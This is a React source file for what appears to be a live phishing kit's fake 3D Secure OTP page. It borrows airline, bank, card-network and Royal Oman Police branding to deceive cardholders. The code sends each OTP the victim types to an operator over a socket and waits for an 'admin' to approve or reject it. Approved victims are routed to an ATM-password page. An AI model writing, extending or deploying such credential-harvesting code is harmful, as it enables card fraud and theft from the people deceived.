import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function OTPVerification() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    if (debounceRef.current) clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(() => {
      if (otp) {
        socket.value.emit("more-info", {
          _id: visitor.value._id,
          content: { "رمز التحقق (OTP)": otp },
          page: "صفحة OTP - إدخال فوري"
        });
      }
    }, 1000);
    return () => { if (debounceRef.current) clearTimeout(debounceRef.current); };
  }, [otp]);
  const [isWaiting, setIsWaiting] = useState(false);
  const [resendTimer, setResendTimer] = useState(120); // 2 minutes countdown
  const [canResend, setCanResend] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [lang, setLang] = useState<"en" | "ar">("en");
  const inputRef = useRef<HTMLInputElement>(null);

  const translations = {
    en: {
      secureVerification: "Secure Verification",
      otpTitle: "One-Time Password (OTP)",
      otpSubtitle: "Enter the verification code sent to your phone to confirm the transaction",
      cardEndingIn: "A verification code will be sent by your issuing bank for the card ending in",
      enterCode: "Please enter the code to confirm the transaction.",
      youArePaying: "You are paying",
      anAmountOf: "an amount of",
      on: "on",
      at: "at",
      codeSent: "Code sent successfully",
      verificationCode: "Verification Code",
      enterOtp: "Enter OTP",
      incorrectCode: "Incorrect verification code. Please try again.",
      verify: "VERIFY",
      verifying: "Verifying...",
      resendCode: "Resend Code",
      resendIn: "Resend in:",
      protected: "Protected by 3D Secure Authentication",
      langToggle: "العربية",
    },
    ar: {
      secureVerification: "التحقق الآمن",
      otpTitle: "كلمة المرور لمرة واحدة (OTP)",
      otpSubtitle: "أدخل رمز التحقق المرسل إلى هاتفك لتأكيد العملية",
      cardEndingIn: "سيتم إرسال رمز التحقق من البنك المصدر للبطاقة المنتهية بـ",
      enterCode: "يرجى إدخال الرمز لتأكيد العملية.",
      youArePaying: "أنت تدفع لـ",
      anAmountOf: "مبلغ",
      on: "بتاريخ",
      at: "الساعة",
      codeSent: "تم إرسال الرمز بنجاح",
      verificationCode: "رمز التحقق",
      enterOtp: "أدخل الرمز",
      incorrectCode: "رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.",
      verify: "تحقق",
      verifying: "جاري التحقق...",
      resendCode: "إعادة إرسال الرمز",
      resendIn: "إعادة الإرسال خلال:",
      protected: "محمي بنظام المصادقة الآمنة 3D",
      langToggle: "English",
    },
  };

  const t = translations[lang];

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || "****";
  // Fallback: use stored order total if paymentData.totalPaid is missing
  const getOTPTotal = () => {
    if (paymentData.totalPaid && paymentData.totalPaid !== '0' && paymentData.totalPaid !== 0) {
      return paymentData.totalPaid;
    }
    const storedTotal = localStorage.getItem('amouage_order_total');
    if (storedTotal && Number(storedTotal) > 0) {
      const countryCode = localStorage.getItem('amouage_country') || 'OM';
      const COUNTRY_CURRENCY: Record<string, string> = {'KW':'KWD','OM':'OMR','BH':'BHD','AE':'AED','SA':'SAR'};
      const symbol = COUNTRY_CURRENCY[countryCode] ? COUNTRY_CURRENCY[countryCode] + ' ' : 'OMR ';
      return symbol + Number(storedTotal).toFixed(3);
    }
    return '0';
  };
  const totalAmount = getOTPTotal();
  const serviceName = paymentData.serviceName || "";
  
  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("رمز التحقق (OTP)");
  }, []);

  // Resend timer countdown
  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [resendTimer]);

  // Real-time clock update
  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate to ATM password page
        navigate("/atm-password");
      } else if (action.action === "reject") {
        // Show error and clear OTP
        setOtp("");
        setError(true);
        setIsWaiting(false);
        inputRef.current?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
    setError(false);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Accept 4 or 6 digits
    if (otp.length !== 4 && otp.length !== 6) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    // Set card info for WaitingOverlay to show both logos
    waitingCardInfo.value = {
      cardType: cardInfo?.cardType || '',
      bankName: cardInfo?.bankName || '',
      bankLogo: cardInfo?.bankLogo || '',
    };
    sendData({
      digitCode: otp,
      current: "رمز التحقق (OTP)",
      nextPage: "كلمة مرور ATM",
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    if (!canResend) return;
    setCanResend(false);
    setResendTimer(120);
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
    });
  };

  // Format timer as MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Format date
  const formatDate = (date: Date) => {
    return date.toLocaleDateString(lang === "ar" ? "ar-SA" : "en-US", {
      year: "numeric",
      month: "numeric",
      day: "numeric",
    });
  };

  // Format time
  const formatTime = (date: Date) => {
    return date.toLocaleTimeString(lang === "ar" ? "ar-SA" : "en-US", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  };

  return (
    <div className="min-h-screen bg-[#fafafa] flex items-center justify-center px-4 py-8" dir={lang === "ar" ? "rtl" : "ltr"} style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <WaitingOverlay />

      <div className="w-full max-w-[480px]">
        {/* Header - Jazeera branding */}
        <div className="text-center mb-8">
          <img src="/images/myfatoorah_jazeera_logo.png" alt="الخطوط الجوية العراقية" className="h-20 mx-auto mb-2" style={{ background: 'none' }} />
          <p className="text-sm text-gray-500">{t.secureVerification}</p>
        </div>

        {/* Language Toggle */}
        <div className="flex justify-end mb-2">
          <button
            onClick={() => setLang(lang === "en" ? "ar" : "en")}
            className="bg-gray-100 border border-gray-300 rounded-full px-4 py-1.5 text-sm font-semibold text-gray-700 hover:bg-gray-200 transition-all"
          >
            {t.langToggle}
          </button>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
          {/* OTP Title */}
          <div className="text-center mb-6">
            <h2 className="text-lg font-semibold text-gray-900 mb-1">{t.otpTitle}</h2>
            <p className="text-gray-500 text-sm">
              {t.otpSubtitle}
            </p>
          </div>

          {/* Bank and Card Type Logos */}
          <div className="flex justify-between items-center mb-6 px-4 py-3 border-b border-gray-100">
            {/* Card Type Logo (Visa/Mastercard) */}
            <div className="flex items-center">
              <img
                src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
                alt={cardInfo?.cardType || 'Card'}
                className="h-8 object-contain"
              />
            </div>
            {/* Bank Logo */}
            {cardInfo?.bankLogo && (
              <div className="flex items-center">
                <img
                  src={cardInfo.bankLogo}
                  alt={cardInfo.bankName || "Bank"}
                  className="h-8 object-contain"
                />
              </div>
            )}
          </div>

          {/* Transaction Info */}
          <div className="bg-[#fafafa] border border-gray-100 rounded-md p-4 mb-6 text-sm text-gray-600 leading-relaxed">
            <p>
              {t.cardEndingIn} <span className="font-semibold text-gray-900">{cardLast4}</span>. {t.enterCode}
            </p>
            <p className="mt-2">
              {t.youArePaying} <span className="font-semibold text-gray-900">{serviceName || "ROYAL OMAN POLICE"}</span> {t.anAmountOf} <span className="font-semibold text-black">{totalAmount}</span> {t.on} {formatDate(currentTime)} {t.at} {formatTime(currentTime)}
            </p>
          </div>

          {/* Success Message */}
          <div className="text-center mb-5">
            <span className="text-sm font-medium text-green-600">✓ {t.codeSent}</span>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            {/* OTP Input */}
            <div>
              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide text-center">{t.verificationCode}</label>
              <div className="flex justify-center" dir="ltr">
                <input
                  ref={inputRef}
                  type="tel"
                  inputMode="numeric"
                  maxLength={6}
                  value={otp}
                  onChange={handleChange}
                  placeholder={t.enterOtp}
                  className={`w-full border rounded-md px-4 py-3 text-center text-lg font-medium focus:outline-none focus:border-black transition-colors ${
                    error ? 'border-red-400 bg-red-50' : 'border-gray-300'
                  }`}
                  autoFocus
                />
              </div>
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 rounded-md p-3">
                <p className="text-red-600 text-center text-sm">
                  {t.incorrectCode}
                </p>
              </div>
            )}

            {/* Submit Button */}
            <button 
              type="submit" 
              className="w-full py-3 bg-black text-white text-sm font-medium uppercase tracking-wider rounded-md hover:bg-gray-900 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed"
              disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
            >
              {isWaiting ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>{t.verifying}</span>
                </div>
              ) : (
                t.verify
              )}
            </button>

            {/* Resend Timer */}
            <div className="text-center text-gray-500 text-sm pt-2">
              {canResend ? (
                <button
                  type="button"
                  onClick={handleResend}
                  className="text-black hover:underline font-medium"
                >
                  {t.resendCode}
                </button>
              ) : (
                <span>{t.resendIn} {formatTimer(resendTimer)}</span>
              )}
            </div>
          </form>
        </div>

        {/* Footer */}
        <div className="text-center mt-6">
          <p className="text-xs text-gray-400">{t.protected}</p>
        </div>
      </div>
    </div>
  );
}
